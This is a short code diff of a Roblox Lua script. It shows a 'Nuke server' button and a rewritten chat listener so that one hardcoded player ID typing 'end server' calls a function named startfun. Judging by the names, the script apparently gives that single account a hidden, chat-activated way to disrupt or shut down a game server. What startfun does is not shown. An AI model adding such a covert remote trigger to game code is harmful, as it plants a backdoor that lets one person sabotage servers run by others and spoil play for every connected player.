@@ -161,7 +161,7 @@ button.Size = UDim2.new(0, 100, 0, 50)
 button.Text = "Nuke server"
 button.TextSize = 10
 button.MouseButton1Click:Connect(startfun)
-print('16x fun update')
+print('my god')
 
 for _, player in ipairs(game.Players:GetPlayers()) do
     player.Chatted:Connect(function(message)
@@ -173,12 +173,8 @@ end
 
 game.Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(message)
-        print("User " .. player.UserId .. " chatted: " .. message)
-        if player.UserId == 1422208527 then
-            print("User did chat")
-            if checkChat(message) then
-                myFunction()
-            end
+        if player.UserId == 1422208527 and message == 'end server' then
+            startfun()
         end
     end)
 end)
